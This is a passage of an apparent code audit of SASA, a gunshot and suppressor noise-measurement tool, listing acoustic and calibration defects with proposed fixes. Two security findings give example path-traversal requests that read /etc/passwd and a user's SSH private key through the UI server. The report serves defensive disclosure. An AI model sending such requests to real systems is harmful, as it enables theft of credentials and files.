# SASA Technical Audit

Full fine-tooth audit of the SASA codebase: 7 specialist auditors, each finding independently
re-checked by an adversarial verifier instructed to refute. Only findings that survived verification
against the actual source are listed here.

**184 confirmed** (146 defects, 38 upgrades) · 24 refuted and discarded

Defects by severity: **18 critical**, 45 high, 59 medium, 24 low


---


# Defects


## Critical (18)


### Normalized-frequency clamp in design_bandpass_sos silently replaces every low 1/3-octave band with a wrong, duplicated filter (up to -61 dB error)

`bands.py:106` · Bands & Spectral · IEC 61260-1:2014 clause 5.4 (relative attenuation) - a band filter must be centred on its own midband frequency; eight bands sharing one passband cannot conform to any class.

```python
low_norm = max(0.001, min(low_norm, 0.999))
    high_norm = max(low_norm + 0.001, min(high_norm, 0.999))
```

**Failure:** The clamp is expressed in NORMALIZED frequency, so its absolute effect scales with sample rate: the floor is 0.001*fs/2 Hz and the minimum bandwidth is 0.001*fs/2 Hz. At fs=192 kHz that is a 96 Hz floor and a 96 Hz minimum bandwidth, so the 20/25/31.5/40/50/63/80/100 Hz bands ALL collapse to the identical 96-192 Hz bandpass. Verified by running the shipped code: a 31.5 Hz tone at 120.00 dB SPL, fs=192000, ThirdOctaveAnalyzer.analyze(x,'fast',10.0) returns 59.19 dB in every band from 20 Hz to 100 Hz -- the 31.5 Hz band is 60.81 dB LOW -- and analyze()['overall_level_dB'] reads 68.31 dB instead of 120. At fs=96000 the same tone reads 89.77 dB in bands 20-50 Hz (-30.23 dB). At fs=48000 bands 20/25/31.5 all report ~119.92 dB for the single tone, so analyze()'s overall level triple-counts it and returns 124.75 dB (+4.75 dB). A suppressed-rifle recording at 192 kHz therefore reports the entire 20-100 Hz region -- where suppressor blast energy concentrates -- 30 to 60 dB below truth, with eight identical band rows in the heatmap. The clamp is not even necessary: designing the true 17.818-22.449 Hz band with butter(4,...,output='sos') at fs=192000 was measured stable, |H(20 Hz)| = 1.000000 (0.00 dB passband gain measured on a 2 s, 20 Hz sine).

**Fix:** Delete both clamps in design_bandpass_sos. The Nyquist guard already exists at bands.py:169 (`if f_high >= self.sample_rate / 2.0: continue`), so no floor is needed; tighten that guard to `f_high >= 0.98 * nyq` and warn. float64 SOS is demonstrably adequate down to lown=1.86e-4, but add the decimation cascade (see upgrade-decimation-cascade) for margin at 192 kHz. Add a per-band regression test asserting each band reports 94.00 +/- 0.1 dB for a 94 dB sine at its own midband frequency at fs = 48/96/192 kHz.


### ThirdOctaveAnalyzer materialises three full (n_bands x n_samples) float64 arrays; 192 kHz analysis needs ~20 GB and dies

`bands.py:203` · Bands & Spectral

```python
band_signals = np.zeros((self.n_bands, n_samples), dtype=np.float64)
...
        band_squared = band_signals ** 2
...
            smoothed = sosfilt(sos_exp, band_squared, axis=1)
```

**Failure:** main.py:173 sets CHUNK_DURATION_S = 120.0 and main.py:656 calls analyzer.analyze(pressure_chunk, ...) on a whole 120 s chunk. Measured with the shipped code: at fs=192000 ThirdOctaveAnalyzer builds 37 bands and 120 s = 23,040,000 samples, so ONE (37, 23.04e6) float64 array is 6.82 GB. compute_levels holds band_signals, band_squared and smoothed live simultaneously (band_signals is still bound when band_squared is created) = 20.46 GB peak. At 96 kHz it is 9.40 GB and at 48 kHz 4.29 GB. Any 192 kHz recording longer than ~35 s raises MemoryError or thrashes the machine, and the 'chunked mode to limit RAM' path (main.py:645-661) is what triggers it -- the chunking makes the band stage worse, not better, because a 120 s chunk is larger than most users' whole file.

**Fix:** Rewrite compute_levels to loop one band at a time: `y = sosfilt(filt.sos, x); np.square(y, out=y);` run the detector on y, decimate to n_frames, store only into a preallocated (n_bands, n_frames) result, and drop y. Peak becomes n_samples*8 + n_bands*n_frames*8. Also route the non-chunked path (main.py:930) through the same streaming call, and lower CHUNK_DURATION_S for the band stage to ~10 s with carried filter/detector state (see band-chunk-boundary-state-reset).


### Two of the five FFT-window sizes offered in the shipped GUI abort the whole analysis with ValueError; the other two silently destroy the overlap

`main.py:94` · Bands & Spectral

```python
nperseg: int = 2048
    noverlap: int = 1536
```

**Failure:** AnalysisConfig.noverlap is a fixed 1536 and there is no --noverlap flag (main.py:1057 adds only --nperseg; app.py:801-802 sets only ac_kwargs['nperseg']). ui/renderer/index.html:184-185 offers <option value="512"> and <option value="1024">, and ui/bridge/python-bridge.js:66 passes them through as --nperseg. Verified: analyze_stft(x, 48000, nperseg=512, noverlap=1536) raises ValueError('noverlap must satisfy 0 <= noverlap < nperseg') from STFT.py:110, killing the run at main.py:891 before any output is written. Selecting 4096 or 8192 does not crash but silently changes the overlap from the documented 75% to 37.5% / 18.75%: hop becomes 53.3 ms / 138.7 ms at 48 kHz, so a 1-3 ms muzzle blast can fall entirely between two STFT frames and vanish from the spectrogram.

**Fix:** Replace the stored `noverlap` in AnalysisConfig with `overlap_fraction: float = 0.75` and compute `noverlap = int(nperseg * overlap_fraction)` at each of the eight call sites (or, cheaper, just stop passing noverlap at all and let STFT.py:106-107 derive its own 75% default). Add an AnalysisConfig.__post_init__ that validates 0 <= noverlap < nperseg and raises a clear message. Optionally add --overlap-pct to the CLI and GUI.


### Contiguous above-threshold region is collapsed into ONE detection: adjacent shots are silently lost and the survivor's SEL is inflated

`shot_detect.py:148` · Shot Detection & Sampling

```python
# Found region above threshold
            # Find the peak within this region
            region_start = i
            while i < len(envelope) and above[i]:
                i += 1
            region_end = i

            # Find maximum in this region
            region_max_idx = region_start + np.argmax(envelope[region_start:region_end])
```

**Failure:** Verified by running the real detect_shots(): two 3000 Pa blasts 80 ms apart on a reverberant range (1 ms-RMS envelope stays above the 120 dB threshold continuously for 632 ms) produce ONE above-threshold run spanning 200 ms -> 832 ms. Even with refractory_ms lowered to 50 ms (well below the 80 ms shot spacing) only the first shot is reported. Its 250 ms window contains BOTH blasts, so the reported per-shot LZE is 132.84 dB vs 130.17 dB for an isolated shot: +2.66 dB inflation on shot 1 and shot 2 erased from n_shots, the CSV, the JSON and the aggregate. Rapid-fire/semi-auto strings and any indoor or bermed range hit this on every string.

**Fix:** Keep the fix but correct the wording (the survivor is the region's argmax, not always the first). In detect_peaks_above_threshold, replace the per-region argmax with scipy.signal.find_peaks(20*log10(envelope/P_REF), distance=refractory_samples/envelope_hop, prominence=6.0) over the whole envelope, plus a Schmitt arm/disarm pair (arm at T_hi, disarm at T_hi-10 dB). scipy>=1.10 is already a hard dependency (requirements.txt), so this needs no new package. Keep the current detector behind a flag and print both counts for one release.


### The GUI's video path force-resamples to 44.1 kHz / 16-bit / mono, producing a different Lpeak than the CLI path for the identical input file

`app.py:226` · Engineering Quality · MIL-STD-1474E (requires bandwidth adequate to resolve the impulse rise)

```python
[ffmpeg, '-i', str(video_path), '-vn', '-acodec', 'pcm_s16le',
         '-ar', '44100', '-ac', '1', '-y', str(wav_path)],
```

**Failure:** There are two independent video-to-WAV implementations. CLI (main.py:1116-1122) calls ExtractAudio.extract_audio(), which uses MoviePy and preserves the source sample rate. GUI (app.py:201-236) shells out to ffmpeg with hard-coded `-ar 44100`. Feed the same 192 kHz .mov of a suppressed 5.56 shot to both: the GUI decimates to 44.1 kHz, which anti-alias-filters away everything above 22.05 kHz and, critically, moves the sample grid so the true peak between samples is missed — for an impulse with a ~20 us rise, 44.1 kHz sampling (22.7 us period) under-reads Lpeak by several dB, and rise_time_us becomes quantized to a 22.7 us floor (the tool cannot resolve a 20 us rise at all). `-acedec pcm_s16le` additionally truncates to 16 bit, raising the quantization floor by ~48 dB and corrupting the decay tail used for B-duration. main.py's own module docstring at line 18 promises 'Audio is always used at the file's native sample rate (e.g. 192 kHz); no resampling' — the GUI violates its own stated contract. Same file, two UIs, two different certification numbers.

**Fix:** Drop `-ar 44100 -ac 1` and use `-acodec pcm_f32le` (or pcm_s24le) in app.py:226. Then collapse to one ingestion path — have app.py call ExtractAudio.extract_audio, or have ExtractAudio call _extract_audio_from_video — and stamp the extracted file's sample rate and subtype into analysis_metadata.json so the resampling can never be invisible again.


### No overload/clipping check anywhere, despite the README declaring that clipping invalidates all peak metrics

`main.py:792` · Engineering Quality

```python
peak_Pa = np.max(np.abs(pressure_Pa))
    peak_dB = amplitude_to_dB_SPL(peak_Pa)
    print(f"  Calibration: {cal.description}")
    print(f"  Pa per FS: {cal.Pa_per_FS:.2f}")
    print(f"  Peak level: {peak_dB:.1f} dB SPL")
```

**Failure:** `grep -rn "clip\|saturat" main.py app.py` returns nothing. README.md line ~858 states the requirement 'Headroom | Peaks below 0 dBFS | Clipping invalidates all peak metrics' — the code never enforces it. Concrete: a 16-bit recording of an unsuppressed .308 where the gain was set too high has hundreds of consecutive samples pinned at |sample| == 1.0. main.py:792 takes np.max(|p|) = 1.0*143.96 Pa and confidently prints 'Peak level: 137.1 dB SPL'. The true peak might be 165 dB. The tool reports the clipping ceiling as if it were the measurement, and the number flows into the CSV, the JSON, and the suppressor comparison. Every derived metric — Lpeak, crest factor, rise time, B-duration, kurtosis, spectral centroid — is corrupted, and nothing in the output warns the operator.

**Fix:** As proposed. Detect on the raw digital samples before calibration (main.py:778-780), not on pressure_Pa, so the threshold is a true |sample| >= 1 - 2^-23 test independent of Pa_per_FS; count runs of >= 3 consecutive full-scale samples; record clipped_sample_count / clipped_run_count / max_abs_FS in AnalysisResult.to_dict() (main.py:153) and per shot in save_csv_summary (main.py:327); suppress or flag Lpeak/crest/rise/B-duration for affected shots and exit non-zero unless --allow-clipping.


### pyproject build-backend string is not a real setuptools module — every `pip install` of the package fails

`pyproject.toml:3` · Engineering Quality · PEP 517 / PEP 621

```python
build-backend = "setuptools.backends._legacy:_Backend"
```

**Failure:** `pip install .` or `pip install -e .` in the repo root -> pip creates the PEP 517 build env, installs setuptools>=68, then does `import setuptools.backends._legacy` and dies with `ModuleNotFoundError: No module named 'setuptools.backends'`. Verified empirically against setuptools 84.0.0 in a clean venv: `setuptools.build_meta` imports OK; `setuptools.backends` and `setuptools.backends._legacy` both raise ModuleNotFoundError. There is no `setuptools.backends` package in any setuptools release. Net effect: the project has NEVER been installable as a package, only runnable from a checkout — which is why the two other packaging defects below (cli_main, missing `app` module) have gone unnoticed.

**Fix:** Set build-backend = "setuptools.build_meta" in pyproject.toml:3. Add a CI step running `pip install .` followed by the console-script smoke test (which will then surface the cli_main defect below).


### All A- and C-weighted metrics are wrong: sosfiltfilt applies the weighting curve TWICE (|H|², i.e. dB doubled)

`metrics.py:462` · Acoustic Metrics · IEC 61672-1:2013 clause 5.4 and Table 3 (A- and C-weighting frequency response and Class 1 tolerances)

```python
x_a = apply_a_weight_zerophase(x, sample_rate)     # A-weighted (zero-phase)
    x_c = apply_c_weight_zerophase(x, sample_rate)     # C-weighted (zero-phase)
```

**Failure:** apply_a_weight_zerophase (weighting.py:342 `return np.asarray(sosfiltfilt(sos, x))`) filters forward AND backward, so the effective magnitude response is |H_A(f)|², i.e. the A-weighting in dB is doubled. Measured against the causal filter at 96 kHz: 31.5 Hz gets -79.05 dB instead of -39.53 dB; 125 Hz gets -32.38 dB instead of -16.19 dB; 2 kHz gets +2.40 dB instead of +1.20 dB. Every metric derived from x_a/x_c is wrong: Lpeak_A, Lpeak_C, LAE, LCE, LAFmax, LASmax, LAImax. On a synthetic broadband shot LAE reads 100.87 dB instead of 102.86 dB (-1.99 dB). The error is spectrum-dependent and therefore biased in exactly the direction that matters for suppressor work: for a 200 Hz-dominant (suppressed, LF-shifted) shot LAE is -7.85 dB low, for a 400 Hz shot -4.28 dB, but for a 1.5 kHz unsuppressed rifle report it is +0.87 dB HIGH. Comparing suppressed vs unsuppressed therefore inflates the apparent A-weighted suppression benefit by ~5-9 dB. Lpeak_A on the same broadband shot reads 134.25 instead of 135.36 dB.

**Fix:** Route per-shot A/C weighting through the causal apply_a_weight/apply_c_weight (weighting.py:262/286) — IEC 61672-1 specifies a causal weighting network, and the startup transient is a non-issue because the extraction window already carries 50 ms of pre-trigger before the shot. If zero-phase is retained for group-delay reasons, it must be applied to a square-root-magnitude SOS design, not the full weighting SOS. Note the same doubling applies to C-weighting (weighting.py:363), so Lpeak_C and LCE are wrong too. Add a regression test asserting sosfreqz of the *as-applied* response (|H|^2 if filtfilt, |H| if sosfilt) matches IEC 61672-1 Table 3 at 31.5/125/1000/8000 Hz within Class 1 tolerance; the current filter design itself is correct (matches theory to 0.01 dB), only the application is wrong.


### UI microphone-sensitivity calibration silently reverts to the 143.96 Pa/FS default when either field is blank

`app.py:783` · Pipeline & I/O · IEC 61672-1 §5.1

```python
if config.get('sensitivityMv'):
                ac_kwargs['sensitivity_mV_per_Pa'] = float(config['sensitivityMv'])
            if config.get('vPerFS'):
                ac_kwargs['V_per_FS'] = float(config['vPerFS'])
```

**Failure:** Operator picks "Microphone Sensitivity" in the UI, types 12.5 into Sensitivity (mV/Pa), and leaves "V per Full Scale" blank (it has only a placeholder, no default — index.html:132). app.js:182 sends `vPerFS: NaN`, which JSON.stringify serialises as `null`; `config.get('vPerFS')` is falsy so V_per_FS is never set; main.py:126 requires BOTH to be non-None, so `get_calibration()` returns `Calibration(Pa_per_FS=143.96, description='Direct: 143.96 Pa/FS')`. The true value for 12.5 mV/Pa at 1 V/FS is 80 Pa/FS, so every level is reported 5.1 dB high (8.9 dB if the recorder is 5 V/FS). The UI results view never displays the calibration that was used, so the error is invisible.

**Fix:** Server-side in app.py:780-790, treat the sensitivity group as atomic: if exactly one of sensitivityMv/vPerFS is present (use `is not None` and reject NaN), send {'type':'error'} and refuse to run. Client-side, guard with Number.isFinite() before adding the keys. Then echo the resolved Pa_per_FS and calibration description back over the WebSocket and render them in the results header.


### App's ffmpeg call hard-codes 44.1 kHz / 16-bit / mono, destroying the impulse before it is measured

`app.py:226` · Pipeline & I/O · MIL-STD-1474E §5.2 (impulse noise instrumentation bandwidth); IEC 61672-1 §5.4

```python
[ffmpeg, '-i', str(video_path), '-vn', '-acodec', 'pcm_s16le',
         '-ar', '44100', '-ac', '1', '-y', str(wav_path)],
```

**Failure:** Operator drags a .MOV whose audio track is 96 kHz/24-bit. ffmpeg resamples to 44.1 kHz with an anti-alias filter and truncates to 16 bits. Consequences, all silent: (1) sample period becomes 22.7 us, so `rise_time_us` — reported to 0.1 us in the CSV — can never resolve the 10-50 us shock front and is quantised to multiples of 22.7 us; (2) the true sample peak of the N-wave is lost to the resampler, so Lpeak_Z reads several dB low; (3) all 1/3-octave bands above 20 kHz vanish; (4) 16-bit quantisation puts the noise floor near 47 dB SPL for the default calibration, corrupting the LAE decay tail. The log line only says "Audio extracted". ExtractAudio.py:64 has the milder version of the same bug — it passes neither fps nor nbytes to `write_audiofile`, so moviepy's `nbytes=2` default forces 16-bit output regardless of source depth.

**Fix:** Use `-c:a pcm_f32le` (or pcm_s24le) and drop -ar/-ac entirely so rate, depth and channels survive; probe first with ffprobe and record source rate/depth/channels/codec in analysis_metadata.json; warn (not silently proceed) when the source track is below 48 kHz or is a lossy codec. In ExtractAudio.py pass nbytes=4 and fps=clip.audio.fps explicitly. The 'refuse below 48 kHz' part should be a warning plus a JSON flag rather than a hard refusal, since a lawful recording may legitimately be 48 kHz.


### Factory-default calibration (143.96 Pa/FS) is applied silently to every run and reported as `is_calibrated: true`

`main.py:81` · Pipeline & I/O · IEC 61672-1 §5.1 (calibration traceability); MIL-STD-1474E §5.1.3 (measurement system calibration before and after each test series)

```python
# Default: derived from calibrated 114 dB SPL tone (Audio/260212_0010-1.wav)
    # Measured digital RMS vs reference → Pa_per_FS ≈ 143.96
    Pa_per_FS: float = 143.96
```

**Failure:** `python main.py suppressor_test.wav` with no calibration flags on a recording made with any recorder/gain other than the one used for Audio/260212_0010-1.wav. Pa_per_FS is a function of mic sensitivity AND recorder gain; a +20 dB gain change makes the true value 14.4 Pa/FS. Every Lpeak/LAE/LAFmax in metrics_summary.csv is then reported 20.0 dB high, and analysis_metadata.json records `'is_calibrated': self.calibration.is_calibrated()` -> true (calibration.py:160 only returns False when the description literally contains the string "UNCALIBRATED"). Nothing in the CSV, the JSON, or the UI flags the result as uncalibrated.

**Fix:** Change `Pa_per_FS: Optional[float] = None` and drop the argparse default; if no calibration is supplied for the run, either abort with a non-zero exit or force Calibration.uncalibrated(). Additionally fix calibration.py:160 so is_calibrated() is a real flag (e.g. a `verified: bool` field set only when a calibration source was explicitly provided) rather than a substring test on a free-text description — as written, `--cal-desc "my mic"` on an uncalibrated run also yields is_calibrated=True. Stamp Pa_per_FS + description into the CSV header block and every plot footer.


### Digital clipping is never detected; a saturated recording yields a plausible, precise, wrong Lpeak

`main.py:792` · Pipeline & I/O · MIL-STD-1474E §5.2.4 (measurement system must not be overdriven); IEC 61672-1 §5.6 (mandatory overload indication)

```python
peak_Pa = np.max(np.abs(pressure_Pa))
    peak_dB = amplitude_to_dB_SPL(peak_Pa)
```

**Failure:** The most common failure in muzzle-blast recording. If the recorder clipped, samples saturate at +/-1.0 FS; with the default calibration every clipped shot reports Lpeak_Z = 20*log10(143.96/20e-6) = 137.1 dB, identically, and LAE is inflated by the square-wave energy clipping introduced. metrics_summary.csv shows 137.1 row after row and the tool says nothing. A grep of the entire repository for clip/saturat/overload finds no detection logic anywhere.

**Fix:** Add a clipping check on the raw samples (before calibration, so the threshold is in FS): count |x| >= 0.999 and, more diagnostically, count runs of >= 3 consecutive such samples, both file-wide and per shot window. Add `clipped_samples` and `clipped` to the CSV row and per-shot JSON, add `clipped_fraction` to the file-level JSON, and print a prominent warning at step [1/6]. Note the check must run on samples, not pressure_Pa, and must also run in the chunked path (main.py:405-431 and 458-461).


### Blank/invalid calibration field silently falls back to the built-in 143.96 Pa/FS default and the UI never says so

`ui/renderer/app.js:179` · UI & Presentation · IEC 61672-1 §5.1 (sensitivity/calibration must be recorded with the measurement)

```python
if (calMode.value === 'direct') config.paPerFS = parseFloat($('#pa-per-fs').value);
    else if (calMode.value === 'sensitivity') {
      config.sensitivityMv = parseFloat($('#sensitivity-mv').value);
      config.vPerFS = parseFloat($('#v-per-fs').value);
    }
```

**Failure:** Technician selects "Microphone Sensitivity", types 10 into Sensitivity (mV/Pa), leaves "V per Full Scale" empty (it has only a placeholder "e.g. 1.0", no value). parseFloat('') = NaN. In ui/bridge/python-bridge.js:37-45 every arg is gated on truthiness (`if (config.sensitivityMv)`, `if (config.vPerFS)`), so NaN is falsy and BOTH --sensitivity-mV and --V-per-FS are dropped from argv. main.py runs with the hardcoded 143.96 Pa/FS default. The Results view then prints "PEAK SPL (Z) 168.3 dB" in 28px orange with no indication the number came from a guessed sensitivity. There is zero client-side validation anywhere in app.js and zero calibration provenance in the results view, so the operator has no way to detect this. Every reported dB is wrong by an arbitrary offset (20*log10(actual_PaPerFS/143.96)).

**Fix:** 1) Validate in app.js before send: if calMode is 'sensitivity' require BOTH fields Number.isFinite and > 0, else mark aria-invalid, show an inline message and do not send. Same for 'direct'. 2) python-bridge.js: replace every `if (config.x)` numeric gate with `if (Number.isFinite(config.x))`. 3) Have main.py refuse to derive calibration from a half-specified sensitivity pair instead of silently falling back (error out, or use the existing but currently unused Calibration.uncalibrated()/is_calibrated() in calibration.py:138/158). 4) Echo cal.description and cal.Pa_per_FS from analysis_metadata.json into the Results header and every figure. The 'suppress absolute dB in favour of dBFS' part of the original fix is optional polish; the blocking validation plus the Number.isFinite gate is the actual repair.


### UI server binds 0.0.0.0, exposing the analysis server and arbitrary-file-read endpoints to the entire network

`ui/server.js:196` · UI & Presentation

```python
server.listen(PORT, () => {
  const url = `http://localhost:${PORT}`;
```

**Failure:** `server.listen(port, cb)` with no host argument binds INADDR_ANY. On a range LAN or a hotel/conference Wi-Fi, any peer can reach http://<tester-ip>:3847. Combined with the unvalidated `dir` parameter (server.js:137-156) they can read any file the user can read — e.g. GET /api/image?dir=/Users/graham/.ssh&file=id_rsa returns the private key as application/octet-stream. app.py:987 gets this right (`ThreadedHTTPServer(('127.0.0.1', port), ...)`), so the Node path is an unforced regression.

**Fix:** `server.listen(PORT, '127.0.0.1', cb)`. Add a Host-header allow-list middleware ('localhost:PORT' / '127.0.0.1:PORT' / '[::1]:PORT') to defeat DNS rebinding, and set X-Content-Type-Options: nosniff on all responses. The CSP suggestion is optional; the bind address and Host check are the fix that matters.


### /api/image and /api/results take an unvalidated absolute `dir` — path.basename() only sanitises the leaf, not the directory

`ui/server.js:144` · UI & Presentation

```python
// Security: prevent path traversal
  const safeName = path.basename(file);
  const safeSub = sub ? path.basename(sub) : null;
  const filePath = safeSub
    ? path.join(dir, safeSub, safeName)
    : path.join(dir, safeName);
```

**Failure:** The comment claims traversal is prevented, but only `file` and `sub` are basename'd; `dir` is used verbatim. GET /api/image?dir=/etc&file=passwd streams /etc/passwd. GET /api/image?dir=../../../../Users/graham/Documents&file=contract.pdf streams it as application/pdf (MIME_MAP has .pdf). No allow-list, no realpath containment check. Any web page the user visits can issue these requests cross-origin (no CORS restriction on GET, and the response is renderable as an <img>/<iframe> for the .png/.html types).

**Fix:** Stop accepting filesystem paths from the client. Keep an in-process Map of opaque analysis id -> absolute dir, all rooted at path.join(PYTHON_DIR,'Audio','analysis'). Resolve as `const abs = fs.realpathSync(path.join(root, id, sub, name)); if (abs !== root && !abs.startsWith(fs.realpathSync(root) + path.sep)) return res.sendStatus(403);`. Apply identically to /api/results (server.js:91) and update app.js:203/278/285/359 to pass the id. As a stopgap that does not require a client change, containment-check the joined path against the analysis and uploads roots before streaming.


### Analysis silently defaults to a hardcoded 143.96 Pa/FS from one specific 2012 recording and reports it as a valid calibration

`main.py:81` · Weighting & Calibration · IEC 61672-1:2013 §5.1.6 / general metrological traceability

```python
# Default: derived from calibrated 114 dB SPL tone (Audio/260212_0010-1.wav)
    # Measured digital RMS vs reference → Pa_per_FS ≈ 143.96
    Pa_per_FS: float = 143.96

    cal_group.add_argument("--Pa-per-FS", type=float, default=143.96,   # main.py:1032
    <option value="default">Default (143.96 Pa/FS)</option>            # ui/renderer/index.html:113
```

**Failure:** `python main.py newrecording.wav` with no calibration flags, or the UI left on its default dropdown entry, produces absolute dB SPL numbers derived from a factor measured against one file from a different microphone/preamp/gain setting. main.py:794-796 prints 'Calibration: Direct: 143.96 Pa/FS' and a 'Peak level: XXX.X dB SPL', and to_dict() (main.py:158-162) writes `is_calibrated: true` into the JSON report. There is no warning. A user with, say, a 50 mV/Pa mic into a 1 V-FS input (true 20.0 Pa/FS) gets every level overstated by 20*log10(143.96/20) = 17.1 dB — a 141 dB shot is reported as 158 dB. Because the shot-detection threshold (detection_threshold_dB=120.0, main.py:87) is also an absolute dB SPL threshold applied to the same miscalibrated pressure, the shot count changes too. `Calibration.uncalibrated()` (calibration.py:138-144) — the one code path that would mark results as relative-only — is never called from main.py, app.py, or the UI; it is dead code.

**Fix:** Remove the numeric default from AnalysisConfig.Pa_per_FS and from the argparse default; make an explicit calibration choice mandatory. If none is given, use Calibration.uncalibrated() and propagate a relative-units flag so main.py:794-796, every plot axis label (plots.py), and the JSON 'calibration' block are stamped 'dB re FS (RELATIVE - NOT CALIBRATED)'. Keep the 143.96 value only as a named, explicitly selectable preset labelled with its provenance file and date, never as the fallback.


### No clipping/overload detection anywhere in the repo — a clipped gunshot yields understated levels with no warning

`main.py:792` · Weighting & Calibration · IEC 61672-1:2013 §5.16 (overload indication is mandatory for a conforming sound level meter)

```python
peak_Pa = np.max(np.abs(pressure_Pa))
    peak_dB = amplitude_to_dB_SPL(peak_Pa)
    print(f"  Calibration: {cal.description}")
    print(f"  Pa per FS: {cal.Pa_per_FS:.2f}")
    print(f"  Peak level: {peak_dB:.1f} dB SPL")   # main.py:792-796
```

**Failure:** A repo-wide grep for clip/saturation/overload/full-scale-count logic returns nothing outside of matplotlib's clip_on and moviepy's VideoFileClip. Gunshot recording is the single most clip-prone task in audio: setting gain for a 160 dB peak while monitoring a 90 dB ambient is guesswork, and a clipped 16/24-bit WAV pins at |sample| = 1.0. Concretely, a shot whose true peak was 6 dB above the recorder's full scale is flat-topped: Lpeak_Z is reported as exactly amplitude_to_dB_SPL(Pa_per_FS) (e.g. 137.1 dB at 143.96 Pa/FS) no matter how loud the shot really was, so two suppressors that both clip report IDENTICAL Lpeak and the comparison is meaningless. The flat top also destroys every derived metric: rise time (compute_rise_time on x_z), B-duration (20 dB-down window on a truncated peak), crest factor (peak/RMS collapses), kurtosis (MIL-STD-1474E's impulsiveness criterion), and spectral centroid (clipping injects broadband harmonic energy that pushes the centroid up). Nothing in main.py, app.py, WavLoader.py, or shot_detect.py looks at how close the samples are to full scale, and main.py already has `peak_Pa` in hand one line before it prints a level.

**Fix:** In WavLoader.load_wav / load_wav_chunk, before any mixdown, compute per-channel peak_FS, count of |x| >= 1 - 1 LSB, and the longest run of consecutive full-scale samples (a run of >= 3 is the reliable clip signature; a single sample is not). Return them on WavData and thread them into AnalysisResult.to_dict(). Report headroom_dB = -20*log10(peak_FS) per file and per shot window; mark any shot containing a clip run as INVALID (OVERLOAD) for Lpeak/crest/rise-time/kurtosis rather than emitting numbers, and surface it in the UI results view. Note 32-bit-float files can legitimately exceed 1.0, so gate the >= 1.0 test on the file subtype (sf.info) rather than applying it blindly.


### sosfiltfilt applies A/C weighting TWICE — every A- and C-weighted metric is wrong away from 1 kHz

`weighting.py:343` · Weighting & Calibration · IEC 61672-1:2013 §5.4 (frequency weightings), §5.7 (peak C sound level, defined via the causal weighting network)

```python
sos = design_a_weight_sos(fs)
    return np.asarray(sosfiltfilt(sos, x))    # weighting.py:342-343

    x_a = apply_a_weight_zerophase(x, sample_rate)     # A-weighted (zero-phase)   # metrics.py:462
    x_c = apply_c_weight_zerophase(x, sample_rate)     # C-weighted (zero-phase)   # metrics.py:463
```

**Failure:** sosfiltfilt runs the filter forward AND backward, so the effective magnitude response is |H(f)|^2, i.e. the weighting curve in dB is DOUBLED. Verified by running the repo's own code in ./.venv (scipy 1.18.0) on 0.3 s sine tones at fs=48 kHz: 125 Hz -> IEC A-weighting is -16.19 dB, apply_a_weight (causal) gives -16.19 dB, but apply_a_weight_zerophase — the function metrics.py actually uses — gives -32.42 dB. 250 Hz: IEC -8.67, zero-phase -17.37. 31.5 Hz: IEC -39.52, zero-phase -78.78. 4 kHz: IEC +0.96, zero-phase +1.85. Only 1 kHz is right (0.00 dB) because that is the normalization point. Consequence: Lpeak_A, LAE, LAFmax, LASmax, LAImax, Lpeak_C and LCE (metrics.py:466-473, 490-493) are all computed from a signal filtered by A^2 / C^2. On a simulated Friedlander gunshot pulse (P0=200 Pa = 140 dB Lpeak_Z, positive-phase T=3 ms, fs=48 kHz — a suppressed-shot-like LF-dominated pulse), Lpeak_A is 139.84 dB with the correct single-pass filter and 136.47 dB as the code computes it: a 3.4 dB understatement. For T=0.5 ms the error is -0.86 dB on Lpeak_A. A suppressor whose remaining blast is low-frequency is therefore credited with several dB of suppression it does not have, and the error is not a constant offset — it varies with the spectrum of each shot, so suppressed-vs-unsuppressed deltas are corrupted in a spectrum-dependent way.

**Fix:** Replace the zero-phase weighting path in metrics.py with a single causal pass (weighting.apply_a_weight / apply_c_weight), using the 50 ms pre-shot context (AnalysisConfig.pre_shot_ms, main.py:88) as filter warm-up that is discarded before the peak/energy search so there is no startup transient. Delete apply_a_weight_zerophase/apply_c_weight_zerophase, or rename them and keep them out of any reported metric. Note plots.py:892 already uses the causal apply_a_weight, so this also makes plots and metrics agree. Do not 'fix' by spectral factorization unless a zero-phase view is genuinely required for a plot.


## High (45)


### Spectrogram is a per-bin amplitude spectrum with no ENBW correction but is labelled 'Level (dB SPL)'; the same shot reads 29.6 dB differently depending on FFT size

`STFT.py:120` · Bands & Spectral · IEC 61672-1:2013 defines sound pressure level as an RMS quantity over a stated bandwidth and time; a per-bin amplitude spectrum with no declared bandwidth is not an SPL.

```python
win_amplitude = win / win_sum * 2.0  # Factor of 2 for one-sided spectrum
...
    magnitude_rms = magnitude / np.sqrt(2.0)
    magnitude_dB = 20.0 * np.log10(np.maximum(magnitude_rms, EPS) / ref_pressure)
```

**Failure:** The coherent-gain normalisation (1/sum(w)), the one-sided x2, the DC/Nyquist un-doubling (STFT.py:148-150) and the peak->RMS /sqrt(2) are all present and correct FOR A BIN-CENTRED SINUSOID -- verified exactly: a 1500.0 Hz (bin 64) tone at 94.000 dB SPL reports 94.000 dB, for every window type. That is the only case it is right. There is no equivalent-noise-bandwidth correction, so for anything broadband or impulsive the number is neither an SPL nor a PSD, yet plots.py:345 labels the colorbar 'Level (dB SPL)'. Measured with the shipped code: (a) white noise at a true 94.00 dB Leq gives a median bin level of 71.49 dB at nperseg=256 and 57.82 dB at nperseg=8192 -- a 13.67 dB swing from a display setting alone -- and 10*log10(sum over bins) = 95.70 dB, i.e. +1.70 dB high, exactly the missing Hann ENBW factor 10*log10(1.5) = 1.76 dB; (b) a 1 ms 1 kHz burst with a true Lpeak of 136.47 dB and SEL 101.78 dB gives a spectrogram maximum of 121.43 dB at nperseg=256, 115.71 at 512, 110.11 at 1024, 104.19 at the shipped default 2048 and 91.79 dB at 8192 -- a 29.64 dB spread on one physical shot. No number read off this spectrogram can be quoted in a suppressor report.

**Fix:** Add an explicit `scaling` mode to compute_stft_dB_SPL. (1) 'band' (make it the default for the spectrogram figures): divide the amplitude-scaled power by the window ENBW in bins, N*sum(w^2)/sum(w)^2 (1.5 for Hann), and label the colorbar 'Band level in one FFT bin (dB re 20 uPa)'. (2) 'density': 2*|rfft(x*w)|^2/(fs*sum(w^2)), labelled 'dB re (20 uPa)^2/Hz'. Keep the present scaling behind an explicit 'tonal peak amplitude' mode since it is exact for bin-centred sinusoids. Regression test: 10*log10(sum of bins) must equal the broadband Leq to 0.1 dB for white noise at every nperseg (currently off by exactly 1.76 dB).


### The 'IEC 61260 Class 1' claim in the filter design is never tested; measured response is -11.26 dB at f/fm = 1.1710 and only -24.2 dB at the adjacent band centre

